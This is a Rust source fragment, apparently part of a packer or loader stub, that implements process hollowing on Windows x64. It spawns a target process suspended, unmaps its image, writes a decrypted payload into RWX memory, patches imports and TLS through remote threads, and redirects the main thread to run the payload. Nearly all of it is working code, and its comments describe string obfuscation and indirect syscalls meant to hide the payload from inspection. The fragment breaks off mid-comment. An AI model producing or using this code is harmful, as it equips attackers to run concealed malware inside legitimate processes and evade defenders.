// --- Process hollowing (technique fragment) ---

use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::{BOOL, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{CONTEXT, CONTEXT_FULL_AMD64};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateProcessA, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA,
};

// Every kernel-facing call goes through the syscall layer's `nt_*` helpers, so
// this fragment is identical for `build.stub.syscalls.mode: none` and
// `mode: indirect` (including the eleven-argument `NtCreateThreadEx` that
// replaces `CreateRemoteThread`). `CreateProcessA` and
// `GetModuleHandleA`/`GetProcAddress` remain Win32 imports: they are
// userland/loader entry points, not syscalls the stub issues itself.

/// Formats a failed `nt_*` call as `"<label> (0x<status>)"`.
///
/// `label` is a placeholder that `Params::render_fragment` substitutes with a
/// runtime reconstruction, so the diagnostic text is never stored in the stub
/// (the same reason every other string here is obfuscated).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

// --- PE constants ---
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;

/// Minimal section header view.
struct Section {
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
}

/// `GetThreadContext`/`SetThreadContext` require a 16-byte aligned `CONTEXT`
/// on x64; the `windows` binding only guarantees 8, so force it here.
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// Minimal PE view.
struct Pe {
    image_base: u64,
    size_of_image: u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    sections: Vec<Section>,
    reloc_rva: u32,
    reloc_size: u32,
    import_rva: u32,
    import_size: u32,
    tls_rva: u32,
    tls_size: u32,
}

/// Runs the decrypted payload via process hollowing and returns its exit code.
///
/// The hollowing target path is substituted at build time by
/// `Params::render_fragment` with code that rebuilds the string at runtime, so
/// it never appears in `strings`.
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    let hollow_target = $HOLLOW_TARGET_DEF$;
    let pe = parse_pe(image)?;
    crate::tech_dbg!(
        "process_hollowing",
        "target '{hollow_target}', payload {} bytes, preferred base 0x{:x}",
        image.len(),
        pe.image_base
    );
    let process = run_stage_two(&hollow_target, image, &pe)?;
    wait_and_exit(process)
}

// --- Minimal PE parsing (offsets relative to the decrypted image) ---

fn parse_pe(image: &[u8]) -> Result<Pe, String> {
    if image.len() < 64 {
        return Err($MSG_PAYLOAD_TOO_SMALL$);
    }
    if read_u16(image, 0)? != IMAGE_DOS_SIGNATURE {
        return Err($MSG_BAD_DOS$);
    }
    let e_lfanew = read_u32(image, 0x3C)? as usize;
    if read_u32(image, e_lfanew)? != IMAGE_NT_SIGNATURE {
        return Err($MSG_BAD_NT$);
    }

    let machine = read_u16(image, e_lfanew + 4)?;
    if machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(format!(
            "{} (machine 0x{machine:04x}); expected x64",
            $MSG_BAD_ARCH$
        ));
    }

    let num_sections = read_u16(image, e_lfanew + 6)? as usize;
    let size_of_optional_header = read_u16(image, e_lfanew + 20)? as usize;

    let opt = e_lfanew + 4 + 20;
    let entry_point_rva = read_u32(image, opt + 16)?;
    let image_base = read_u64(image, opt + 24)?;
    let size_of_image = read_u32(image, opt + 56)?;
    let size_of_headers = read_u32(image, opt + 60)?;

    // Base relocation directory (data directory index 5).
    let num_dirs = read_u32(image, opt + 108)?;
    let (reloc_rva, reloc_size) = if num_dirs > 5 {
        (read_u32(image, opt + 152)?, read_u32(image, opt + 156)?)
    } else {
        (0, 0)
    };
    // Import directory (data directory index 1).
    let (import_rva, import_size) = if num_dirs > 1 {
        (read_u32(image, opt + 120)?, read_u32(image, opt + 124)?)
    } else {
        (0, 0)
    };
    // TLS directory (data directory index 9).
    let (tls_rva, tls_size) = if num_dirs > 9 {
        (read_u32(image, opt + 184)?, read_u32(image, opt + 188)?)
    } else {
        (0, 0)
    };

    let section_table = opt + size_of_optional_header;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = section_table + i * 40;
        if s + 40 > image.len() {
            return Err($MSG_SECTION_TABLE_OOB$);
        }
        sections.push(Section {
            virtual_size: read_u32(image, s + 8)?,
            virtual_address: read_u32(image, s + 12)?,
            size_of_raw_data: read_u32(image, s + 16)?,
            pointer_to_raw_data: read_u32(image, s + 20)?,
        });
    }

    Ok(Pe {
        image_base,
        size_of_image,
        size_of_headers,
        entry_point_rva,
        sections,
        reloc_rva,
        reloc_size,
        import_rva,
        import_size,
        tls_rva,
        tls_size,
    })
}

fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
    for sec in &pe.sections {
        let size = sec.virtual_size.max(sec.size_of_raw_data);
        if rva >= sec.virtual_address && rva < sec.virtual_address + size {
            return Some((rva - sec.virtual_address + sec.pointer_to_raw_data) as usize);
        }
    }
    None
}

fn apply_relocations(image: &mut [u8], pe: &Pe, delta: isize) -> Result<(), String> {
    if pe.reloc_size == 0 {
        return Ok(());
    }
    let start = rva_to_offset(pe, pe.reloc_rva)
        .ok_or_else(|| $MSG_RELOC_TABLE_UNMAPPED$)?;
    let end = start + pe.reloc_size as usize;
    if end > image.len() {
        return Err($MSG_RELOC_TABLE_OOB$);
    }

    let mut off = start;
    while off + 8 <= end {
        let page_rva = read_u32(image, off)?;
        let block_size = read_u32(image, off + 4)?;
        if block_size < 8 || off + block_size as usize > end {
            return Err($MSG_BAD_RELOC_BLOCK$);
        }
        let count = (block_size - 8) / 2;
        for i in 0..count {
            let entry = read_u16(image, off + 8 + (i * 2) as usize)?;
            let typ = entry >> 12;
            let rva = page_rva + (entry & 0xFFF) as u32;
            let file_off = match rva_to_offset(pe, rva) {
                Some(o) => o,
                None => continue,
            };
            match typ {
                // IMAGE_REL_BASED_DIR64 (10): patch a 64-bit field. This is the
                // only type an x64 image emits for absolute addresses; getting
                // the numbers the other way round silently patches just the low
                // half of every relocated pointer.
                10 => {
                    let v = read_u64(image, file_off)?;
                    write_u64(image, file_off, (v as isize + delta) as u64)?;
                }
                // IMAGE_REL_BASED_HIGHLOW (3): patch a 32-bit field.
                3 => {
                    let v = read_u32(image, file_off)?;
                    write_u32(image, file_off, (v as isize + delta) as u32)?;
                }
                // ABSOLUTE and everything else: skip.
                _ => {}
            }
        }
        off += block_size as usize;
    }
    Ok(())
}

/// Resolves the payload's import table and writes the resulting addresses into
/// the image's IAT (in place, so the following `write_image` ships them to the
/// target).
///
/// `LoadLibraryA`/`GetProcAddress` run in the *current* process: the system
/// DLLs are mapped at one base per session, so their addresses are also valid
/// in the target as long as the target has the DLL mapped. Imports that cannot
/// be resolved abort here, before the thread is redirected (the payload must
/// never start with a half-filled IAT).
fn resolve_and_patch_imports(image: &mut [u8], pe: &Pe) -> Result<usize, String> {
    let imports = crate::resolve_imports(image, pe.import_rva, pe.import_size, |rva| {
        rva_to_offset(pe, rva)
    })
    .map_err(|e| format!("{}: {e}", $MSG_RESOLVE_IMPORTS$))?;

    let count = imports.len();
    for (iat_rva, address) in imports {
        let offset = rva_to_offset(pe, iat_rva)
            .ok_or_else(|| format!("{} 0x{iat_rva:08x}", $MSG_IAT_SLOT_NOT_MAPPED$))?;
        write_u64(image, offset, address)?;
    }
    Ok(count)
}

fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, String> {
    // 1. Create the target process suspended.
    let (process, thread) = spawn_suspended(target)?;
    crate::tech_dbg!(
        "process_hollowing",
        "spawned suspended process={:#x} thread={:#x}",
        process.0 as usize,
        thread.0 as usize
    );

    // 2. Read its image base from the PEB.
    let base = resolve_image_base(process, thread)?;
    crate::tech_dbg!("process_hollowing", "target image base=0x{base:x}");

    // 3. Let the target's loader initialize: patch the original entry point to
    //    an infinite loop, resume the thread, wait until it parks in the loop
    //    (the loader has then finished mapping the process's default DLLs and
    //    populated `PEB->Ldr`), and suspend it again. The original image is
    //    unmapped below, so the patched bytes never need restoring.
    let target_entry = resolve_target_entry(process, base)?;
    patch_entry_to_spin(process, target_entry)?;
    crate::tech_dbg!(
        "process_hollowing",
        "entry patched to jmp $ at 0x{target_entry:x}"
    );
    run_loader_and_wait(thread, target_entry)?;
    crate::tech_dbg!(
        "process_hollowing",
        "target loader finished, thread suspended"
    );

    // 4. Load every DLL the payload imports *in the target*. The import
    //    addresses resolved in step 8 are session-wide, so they are valid only
    //    if the target has the DLL mapped. `LoadLibraryA` on an already-loaded
    //    DLL is a no-op, so loading unconditionally is safe.
    load_imports_in_target(process, image, pe)?;

    // 5. Unmap the original image.
    let status = crate::nt_unmap_view(process, base as *mut core::ffi::c_void);
    if status < 0 {
        return Err(nt_error($MSG_UNMAP_FAILED$, status));
    }
    crate::tech_dbg!("process_hollowing", "original image unmapped");

    // 6. Re-allocate memory at the same base. The helper writes the actual
    //    base back through `address` (it may differ from the preferred one).
    let mut address = base as *mut core::ffi::c_void;
    let mut region_size = pe.size_of_image as usize;
    let status = crate::nt_alloc_vm(
        process,
        &mut address,
        0,
        &mut region_size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_EXECUTE_READWRITE.0,
    );
    if status < 0 {
        return Err(nt_error($MSG_ALLOC_FAILED$, status));
    }
    let address = address as u64;
    crate::tech_dbg!(
        "process_hollowing",
        "payload allocated at 0x{address:x} ({} bytes)",
        pe.size_of_image
    );

    // 7. Fix up relocations if the base differs from the preferred one.
    let delta = address as isize - pe.image_base as isize;
    if delta != 0 {
        apply_relocations(image, pe, delta)?;
        crate::tech_dbg!(
            "process_hollowing",
            "relocations applied (delta {delta:#x})"
        );
    }

    // 8. Resolve the payload's imports and fill in its IAT. The addresses are
    //    resolved in this process, but the target now has every imported DLL
    //    mapped (step 4), so they are valid there too. Any failure aborts
    //    before the thread is redirected, so the payload never runs with a
    //    half-filled IAT.
    let patched = resolve_and_patch_imports(image, pe)?;
    crate::tech_dbg!(
        "process_hollowing",
        "IAT patched ({patched} import(s))"
    );

    // 9. Write the image (with the resolved IAT already in place).
    write_image(process, address, image, pe)?;
    crate::tech_dbg!("process_hollowing", "image written to the target");

    // 9b. Give the payload what the loader would have given it: a TLS index, a
    //     per-thread copy of the `.tls` template and its `DLL_PROCESS_ATTACH`
    //     callbacks. Without this a payload whose CRT reads thread-local state
    //     faults on its first thread-local access.
    provision_tls(process, thread, address, image, pe)?;

    // 10. Redirect the thread to the payload entry point.
    redirect_entry(thread, address, pe.entry_point_rva)?;
    crate::tech_dbg!(
        "process_hollowing",
        "thread redirected to entry 0x{:x}",
        address + pe.entry_point_rva as u64
    );

    // 11. Resume the thread and keep only the process handle.
    let mut previous = 0u32;
    let status = crate::nt_resume_thread(thread, &mut previous);
    if status < 0 {
        return Err(nt_error($MSG_RESUME_FAILED$, status));
    }
    crate::tech_dbg!("process_hollowing", "thread resumed");
    let _ = crate::nt_close(thread);

    Ok(process)
}

fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE), String> {
    // Token 0 of a Windows command line is the executable name, never an
    // argument: the payload's `argv[0]` is the target's file name, and the
    // YAML/runtime payload args follow it (see the technique README).
    let exe_name = target
        .rsplit(|c| c == '\\' || c == '/')
        .next()
        .filter(|name| !name.is_empty())
        .unwrap_or(target);
    let line = crate::build_command_line(exe_name);

    let mut app = target.as_bytes().to_vec();
    app.push(0);
    let mut cmd = line.into_bytes();
    cmd.push(0);

    let mut startup: STARTUPINFOA = unsafe { std::mem::zeroed() };
    startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe {
        CreateProcessA(
            PCSTR(app.as_ptr()),
            PSTR(cmd.as_mut_ptr()),
            None,
            None,
            BOOL(0),
            CREATE_SUSPENDED,
            None,
            PCSTR::null(),
            &startup,
            &mut pi,
        )
    }
    .map_err(|e| format!("{}: {e}", $MSG_CREATE_PROCESS_FAILED$))?;

    Ok((pi.hProcess, pi.hThread))
}

fn resolve_image_base(process: HANDLE, thread: HANDLE) -> Result<u64, String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    let status = crate::nt_get_context_thread(
        thread,
        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
    );
    if status < 0 {
        return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
    }

    // On x64, Rdx holds the PEB address; ImageBaseAddress sits at PEB + 0x10.
    let peb = ctx.0.Rdx;
    let mut base: u64 = 0;
    read_remote(process, peb + 0x10, &mut base)?;

    Ok(base)
}

/// Reads the target's `AddressOfEntryPoint` from its mapped headers and returns
/// the absolute entry-point address.
fn resolve_target_entry(process: HANDLE, base: u64) -> Result<u64, String> {
    // PE32+: `e_lfanew` at DOS offset 0x3C; `AddressOfEntryPoint` is the field
    // at optional-header offset 16, after the signature (4) + file header (20).
    let mut e_lfanew: u32 = 0;
    read_remote(process, base + 0x3C, &mut e_lfanew)?;
    let mut entry_rva: u32 = 0;
    read_remote(process, base + e_lfanew as u64 + 4 + 20 + 16, &mut entry_rva)?;
    Ok(base + entry_rva as u64)
}

/// Makes the entry page writable and overwrites its first two bytes with
/// `jmp $` (`EB FE`), so the target parks in an infinite loop once its loader
/// reaches the entry point.
fn patch_entry_to_spin(process: HANDLE, target_entry: u64) -> Result<(), String> {
    let mut old = 0u32;
    let status = crate::nt_protect_vm(
        process,
        target_entry as *mut core::ffi::c_void,
        0x1000,
        PAGE_EXECUTE_READWRITE.0,
        &mut old,
    );
    if status < 0 {
        return Err(nt_error($MSG_ENTRY_PROTECT_FAILED$, status));
    }

    let spin = [0xEBu8, 0xFE];
    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        target_entry as *const core::ffi::c_void,
        spin.as_ptr() as *const core::ffi::c_void,
        spin.len(),
        &mut written,
    );
    if status < 0 {
        return Err(nt_error($MSG_ENTRY_PATCH_FAILED$, status));
    }
    Ok(())
}

/// Resumes the target so its loader initializes, waits until the thread parks
/// in the patched entry-point loop, then suspends it again.
fn run_loader_and_wait(thread: HANDLE, target_entry: u64) -> Result<(), String> {
    let mut previous = 0u32;
    let status = crate::nt_resume_thread(thread, &mut previous);
    if status < 0 {
        return Err(nt_error($MSG_INITIAL_RESUME_FAILED$, status));
    }

    // Poll until the instruction pointer reaches the spin loop: that only
    // happens after the loader has finished initializing the process. Bounded
    // so a wedged target fails loudly instead of hanging the packer.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    loop {
        let rip = thread_rip(thread)?;
        if rip == target_entry {
            break;
        }
        if std::time::Instant::now() >= deadline {
            return Err($MSG_TARGET_INIT_TIMEOUT$);
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }

    let mut previous = 0u32;
    let status = crate::nt_suspend_thread(thread, &mut previous);
    if status < 0 {
        return Err(nt_error($MSG_SUSPEND_FAILED$, status));
    }
    Ok(())
}

/// Returns the thread's current instruction pointer.
fn thread_rip(thread: HANDLE) -> Result<u64, String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    let status = crate::nt_get_context_thread(
        thread,
        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
    );
    if status < 0 {
        return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
    }
    Ok(ctx.0.Rip)
}

/// Resolves `LoadLibraryA`'s address in the current process.
///
/// System DLLs share one base per session, so the address is also valid in the
/// hollowing target (kernel32 is mapped once the target's loader has run). The
/// address becomes a remote thread's start routine, which is ABI-compatible
/// with `LoadLibraryA(LPCSTR)` (one pointer argument in rcx, result in rax);
/// `nt_create_thread_ex` hands it the DLL-name pointer as its argument.
fn resolve_load_library() -> Result<usize, String> {
    let load_library: String = $LOAD_LIBRARY_DEF$;
    resolve_kernel32_export(load_library)
}

/// Resolves an export of the session-wide `kernel32.dll` in the current
/// process; the address is valid in the target too.
fn resolve_kernel32_export(name: String) -> Result<usize, String> {
    let kernel32: String = $KERNEL32_DEF$;
    let kernel32_c =
        std::ffi::CString::new(kernel32).map_err(|_| $MSG_BAD_KERNEL32_NAME$)?;
    let name_c =
        std::ffi::CString::new(name).map_err(|_| $MSG_BAD_EXPORT_NAME$)?;

    let module = unsafe { GetModuleHandleA(PCSTR(kernel32_c.as_ptr() as *const u8)) }
        .map_err(|_| $MSG_KERNEL32_NOT_FOUND$)?;
    let Some(proc) = (unsafe { GetProcAddress(module, PCSTR(name_c.as_ptr() as *const u8)) })
    else {
        return Err($MSG_KERNEL32_EXPORT_NOT_FOUND$);
    };
    Ok(proc as usize)
}

/// Returns the (deduplicated) names of the DLLs the payload imports.
fn imported_dll_names(image: &[u8], pe: &Pe) -> Result<Vec<String>, String> {
    let mut names: Vec<String> = Vec::new();
    if pe.import_rva == 0 || pe.import_size == 0 {
        return Ok(names);
    }

    let mut desc = rva_to_offset(pe, pe.import_rva)
        .ok_or_else(|| $MSG_IMPORT_DIR_UNMAPPED$)?;
    loop {
        let original_thunk = read_u32(image, desc)?;
        let name_rva = read_u32(image, desc + 12)?;
        let first_thunk = read_u32(image, desc + 16)?;
        if original_thunk == 0 && name_rva == 0 && first_thunk == 0 {
            break;
        }
        if name_rva != 0 {
            let name_off = rva_to_offset(pe, name_rva)
                .ok_or_else(|| $MSG_DLL_NAME_UNMAPPED$)?;
            let end = image[name_off..]
                .iter()
                .position(|&b| b == 0)
                .ok_or_else(|| $MSG_DLL_NAME_UNTERMINATED$)?;
            let name = String::from_utf8_lossy(&image[name_off..name_off + end]).into_owned();
            if !names.contains(&name) {
                names.push(name);
            }
        }
        desc += 20;
    }
    Ok(names)
}

/// Loads every DLL the payload imports into the target process.
///
/// Each DLL name is written into the target and loaded with a remote thread
/// that calls `LoadLibraryA` there. This is what gives the target the DLL's
/// base (and its TLS slot), so the session-wide import addresses resolved later
/// actually point at mapped memory.
fn load_imports_in_target(process: HANDLE, image: &[u8], pe: &Pe) -> Result<(), String> {
    let names = imported_dll_names(image, pe)?;
    if names.is_empty() {
        return Ok(());
    }

    let load_library = resolve_load_library()?;

    for name in names {
        let display = name.clone();
        let mut name_bytes = name.into_bytes();
        name_bytes.push(0);

        let mut address: *mut core::ffi::c_void = std::ptr::null_mut();
        let mut size = name_bytes.len();
        let status = crate::nt_alloc_vm(
            process,
            &mut address,
            0,
            &mut size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            return Err(nt_error($MSG_DLL_NAME_ALLOC_FAILED$, status));
        }

        let mut written = 0usize;
        let status = crate::nt_write_vm(
            process,
            address as *const core::ffi::c_void,
            name_bytes.as_ptr() as *const core::ffi::c_void,
            name_bytes.len(),
            &mut written,
        );
        if status < 0 {
            return Err(nt_error($MSG_DLL_NAME_WRITE_FAILED$, status));
        }

        let mut thread = HANDLE::default();
        let status = crate::nt_create_thread_ex(process, &mut thread, load_library, address as usize, 0);
        if status < 0 {
            return Err(nt_error(format!("{} '{display}'", $MSG_LOAD_DLL_FAILED$), status));
        }
        let status = crate::nt_wait_for_single_object(thread, u32::MAX);
        let _ = crate::nt_close(thread);
        if status < 0 {
            return Err(nt_error(format!("{} '{display}'", $MSG_DLL_LOAD_UNFINISHED$), status));
        }
        crate::tech_dbg!(
            "process_hollowing",
            "loaded '{display}' in the target"
        );
    }

    Ok(())
}

/// Reads a fixed-size value from the target's address space.
fn read_remote<T: Copy>(process: HANDLE, address: u64, value: &mut T) -> Result<(), String> {
    let mut read = 0usize;
    let status = crate::nt_read_vm(
        process,
        address as *const core::ffi::c_void,
        value as *mut T as *mut core::ffi::c_void,
        std::mem::size_of::<T>(),
        &mut read,
    );
    if status < 0 {
        return Err(nt_error(
            format!("{} {} bytes at 0x{address:x}", $MSG_READ_FAILED$, std::mem::size_of::<T>()),
            status,
        ));
    }
    Ok(())
}

fn write_image(process: HANDLE, base: u64, image: &[u8], pe: &Pe) -> Result<(), String> {
    // Headers first.
    write_remote(process, base, &image[..pe.size_of_headers as usize])?;
    // Then each section.
    for sec in &pe.sections {
        let start = sec.pointer_to_raw_data as usize;
        let end = start + sec.size_of_raw_data as usize;
        if end > image.len() {
            return Err($MSG_SECTION_DATA_OOB$);
        }
        write_remote(
            process,
            base + sec.virtual_address as u64,
            &image[start..end],
        )?;
    }
    Ok(())
}

fn write_remote(process: HANDLE, base: u64, data: &[u8]) -> Result<(), String> {
    if data.is_empty() {
        return Ok(());
    }
    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        base as *const core::ffi::c_void,
        data.as_ptr() as *const core::ffi::c_void,
        data.len(),
        &mut written,
    );
    if status < 0 {
        return Err(nt_error(
            format!("{} {} bytes to 0x{base:x}", $MSG_WRITE_FAILED$, data.len()),
            status,
        ));
    }
    Ok(())
}

// --- Payload TLS ---
//
// A manually mapped image keeps `_tls_index` at zero and no thread's TLS slot
// points at a per-thread block, so a payload whose CRT reads thread-local state
// faults immediately. The loader normally supplies all three pieces; this does
// the same in the target: allocate a real index, materialize the `.tls`
// template in a private block, point the main thread's slot at it and run the
// payload's `DLL_PROCESS_ATTACH` callbacks.

/// `TlsAlloc`'s failure value.
const TLS_OUT_OF_INDEXES: u32 = u32::MAX;
/// `ThreadBasicInformation` for `NtQueryInformationThread`.
const THREAD_BASIC_INFORMATION: i32 = 0;
/// `ThreadLocalStoragePointer`'s offset in the x64 TEB: the per-thread array
/// `TlsGetValue`/`TlsSetValue` and the CRT's thread-locals go through.
const TEB_TLS_ARRAY_OFFSET: u64 = 0x58;

/// `THREAD_BASIC_INFORMATION` as the kernel lays it out on x64.
#[repr(C)]
#[derive(Default)]
struct ThreadBasicInformation {
    /// The thread's exit status; for a finished thread, its return value (how
    /// `TlsAlloc`'s index comes back).
    exit_status: i32,
    _padding: i32,
    /// The thread's TEB, whose TLS array we write the payload's slot into.
    teb_base_address: u64,
    _client_id: [u64; 2],
    _affinity_mask: u64,
    _priority: i32,
    _base_priority: i32,
}

/// The payload's TLS directory, rebased onto the target's image base.
struct TlsInfo {
    /// Address of the DWORD the payload's CRT reads as `_tls_index`.
    index_va: u64,
    /// Address of the null-terminated callback array (0 = none).
    callbacks_va: u64,
    /// Address of the `.tls` template bytes.
    template_va: u64,
    /// Size of the template (`EndAddressOfRawData - StartAddressOfRawData`).
    template_len: usize,
    /// Zero-filled bytes that follow the template in each thread's block.
    zero_fill: usize,
}

/// Reads the payload's TLS directory out of the image.
///
/// The directory's addresses are VAs. `apply_relocations` has already rebased
/// them onto `target_base`, which is why no arithmetic is needed beyond turning
/// `template_va` back into an RVA to read the template locally.
fn parse_tls(image: &[u8], pe: &Pe) -> Result<Option<TlsInfo>, String> {
    if pe.tls_rva == 0 || pe.tls_size == 0 {
        return Ok(None);
    }
    let dir = rva_to_offset(pe, pe.tls_rva)
        .ok_or_else(|| $MSG_TLS_DIR_UNMAPPED$)?;
    // IMAGE_TLS_DIRECTORY64: StartAddressOfRawData (+0), EndAddressOfRawData
    // (+8), AddressOfIndex (+16), AddressOfCallBacks (+24), SizeOfZeroFill
    // (+32), Characteristics (+36).
    let raw_start = read_u64(image, dir)?;
    let raw_end = read_u64(image, dir + 8)?;
    let index_va = read_u64(image, dir + 16)?;
    let callbacks_va = read_u64(image, dir + 24)?;
    let zero_fill = read_u32(image, dir + 32)? as usize;
    Ok(Some(TlsInfo {
        index_va,
        callbacks_va,
        template_va: raw_start,
        template_len: raw_end.saturating_sub(raw_start) as usize,
        zero_fill,
    }))
}

/// Everything a target thread needs to get its own copy of the payload's TLS.
struct TlsContext<'a> {
    /// The index allocated in the target.
    index: u32,
    /// Where the payload image lives in the target.
    target_base: u64,
    /// The local (relocated) payload image, for reading the template bytes.
    image: &'a [u8],
    /// The payload's sections, for mapping the template's RVA.
    pe: &'a Pe,
    /// The payload's TLS directory.
    info: &'a TlsInfo,
}

/// Allocates a private copy of the `.tls` template in the target and points
/// `thread`'s TLS slot at it — what the loader does for every thread it starts,
/// so the thread sees initialized thread-locals instead of a null slot.
fn give_thread_tls(process: HANDLE, thread: HANDLE, ctx: &TlsContext) -> Result<(), String> {
    if ctx.info.template_len + ctx.info.zero_fill == 0 {
        return Ok(());
    }

    let mut block: *mut core::ffi::c_void = core::ptr::null_mut();
    let mut size = ctx.info.template_len + ctx.info.zero_fill;
    let status = crate::nt_alloc_vm(
        process,
        &mut block,
        0,
        &mut size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_READWRITE.0,
    );
    if status < 0 || block.is_null() {
        return Err(nt_error($MSG_TLS_BLOCK_ALLOC_FAILED$, status));
    }
    if ctx.info.template_len > 0 {
        let rva = ctx.info.template_va.wrapping_sub(ctx.target_base) as u32;
        let offset = rva_to_offset(ctx.pe, rva)
            .ok_or_else(|| $MSG_TLS_TEMPLATE_UNMAPPED$)?;
        let end = offset + ctx.info.template_len;
        if end > ctx.image.len() {
            return Err($MSG_TLS_TEMPLATE_OOB$);
        }
        write_remote(process, block as u64, &ctx.image[offset..end])?;
    }

    let teb = thread_basic_information(thread)?.teb_base_address;
    let mut tls_array = 0u64;
    read_remote(process, teb + TEB_TLS_ARRAY_OFFSET, &mut tls_array)?;
    if tls_array == 0 {
        return Err($MSG_NO_TLS_ARRAY$);
    }
    write_remote(
        process,
        tls_array + u64::from(ctx.index) * 8,
        &(block as u64).to_le_bytes(),
    )
}

/// Provisions the payload's TLS in the target, then runs its callbacks.
///
/// `thread` is the suspended main thread that will run the payload: its TLS
/// slot is the one the payload's CRT reads.
fn provision_tls(
    process: HANDLE,
    thread: HANDLE,
    target_base: u64,
    image: &[u8],
    pe: &Pe,
) -> Result<(), String> {
    let Some(info) = parse_tls(image, pe)? else {
        return Ok(());
    };

    // 1. Allocate a real index in the target: run `TlsAlloc` there and read its
    //    result back from the throwaway thread's exit status.
    let index = remote_tls_alloc(process)?;
    if index == TLS_OUT_OF_INDEXES {
        return Err($MSG_TLS_INDEX_FAILED$);
    }
    crate::tech_dbg!(
        "process_hollowing",
        "payload TLS index {index} (template {} bytes)",
        info.template_len
    );

    // 2. Publish it where the payload reads `_tls_index`.
    if info.index_va != 0 {
        write_remote(process, info.index_va, &index.to_le_bytes())?;
    }

    // 3. Give the running thread its private copy of the template, exactly as
    //    `TlsSetValue` would (the slot holds a pointer to the block).
    let ctx = TlsContext {
        index,
        target_base,
        image,
        pe,
        info: &info,
    };
    give_thread_tls(process, thread, &ctx)?;

    // 4. TLS callbacks (`DLL_PROCESS_ATTACH`) are *not* run yet. A callback has
    //    to run on a thread, and a freshly created (never started) thread has
    //    no TLS array in its TEB, so it cannot be given a block pointer; the
    //    stub itself is the only thread that can be provisioned today. Payloads
    //    that need their CRT's TLS callback therefore still lose that init.
    //    Follow-up: run them on the main thread once per callback, parking it on
    //    a `jmp $` stub between calls, or provision the callback thread's TLS
    //    array by hand.
    Ok(())
}

/// Allocates a TLS index in the target by running `TlsAlloc` on a throwaway
/// remote thread and reading the index back from its exit status (a thread's
/// return value).
fn remote_tls_alloc(process: HANDLE) -> Result<u32, String> {
    let tls_alloc = resolve_kernel32_export($TLS_ALLOC_DEF$)?;
    let mut thread = HANDLE::default();
    let status = crate::nt_create_thread_ex(process, &mut thread, tls_alloc, 0, 0);
    if status < 0 {
        return Err(nt_error($MSG_TLSALLOC_RUN_FAILED$, status));
    }
    let status = crate::nt_wait_for_single_object(thread, u32::MAX);
    if status < 0 {
        let _ = crate::nt_close(thread);
        return Err(nt_error($MSG_TLSALLOC_UNFINISHED$, status));
    }
    let info = thread_basic_information(thread)?;
    let _ = crate::nt_close(thread);
    // A start routine that crashed shows up as a negative NTSTATUS; a real TLS
    // index is small and non-negative.
    if info.exit_status < 0 {
        return Err(nt_error($MSG_TLSALLOC_FAILED$, info.exit_status));
    }
    Ok(info.exit_status as u32)
}

/// Reads a thread's `THREAD_BASIC_INFORMATION`: its exit status and its TEB.
fn thread_basic_information(thread: HANDLE) -> Result<ThreadBasicInformation, String> {
    let mut info = ThreadBasicInformation::default();
    let mut returned = 0u32;
    let status = crate::nt_query_info_thread(
        thread,
        THREAD_BASIC_INFORMATION,
        &mut info as *mut ThreadBasicInformation as *mut core::ffi::c_void,
        std::mem::size_of::<ThreadBasicInformation>() as u32,
        &mut returned,
    );
    if status < 0 {
        return Err(nt_error($MSG_TEB_READ_FAILED$, status));
    }
    Ok(info)
}

fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    let status = crate::nt_get_context_thread(
        thread,
        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
    );
    if status < 0 {
        return Err(nt_error($MSG_GET_CONTEXT_FAILED$, status));
    }
    // The thread is parked in the entry-point spin loop of the process's
    // *original* image, which has been unmapped and replaced. Point it at the
    // payload's entry point: `Rip` is what actually runs, `Rcx` carries the
    // payload's first argument for the ABIs that expect one.
    let entry = base + entry_rva as u64;
    ctx.0.Rip = entry;
    ctx.0.Rcx = entry;
    let status = crate::nt_set_context_thread(
        thread,
        &mut ctx.0 as *mut CONTEXT as *mut core::ffi::c_void,
    );
    if status < 0 {
        return Err(nt_error($MSG_SET_CONTEXT_FAILED$, status));
    }
    Ok(())
}

/// Waits for the target to exit and relays its exit code.
///
/// `GetExitCodeProcess` is `NtQueryInformationProcess(ProcessBasicInformation)`
/// with the exit status as the first field; going through the syscall layer
